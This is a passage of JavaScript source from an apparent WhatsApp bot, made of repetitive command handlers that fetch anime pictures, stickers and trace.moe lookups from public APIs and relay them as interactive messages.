_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animetickle': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animegecg': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'dogwoof': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case '8ballpool': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'goosebird': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefeed': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeavatar': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'lizardpic': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'catmeow': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'anime': {
if (!text) return replygcxeon(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
await XeonStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcxeon(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${text}*_\n\n${animetxt}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:anime.picture}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                
                }
                break
			case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'traceanime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return replygcxeon("*Respond to an image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return replygcxeon("*Error: Could not track the anime.*");
    }
    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = `*Anime:* ${animeTitle}\n`;
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
    }
    message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
    message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
    if (episode) {
      message += `*Episode:* ${episode}\n`;
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
      video,
      episode,
    });
    // Send the video with anime information as the caption
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url: video}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error("Error:", error);
    replygcxeon("*Error: Could not track the anime or send the video.*");
  }
};
break
			case 'shinobu':{
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
			case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
	if (m.isGroup) return XeonStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replygcxeon(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replygcxeon('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				XeonBotInc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				XeonBotInc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replygcxeon(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
			case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
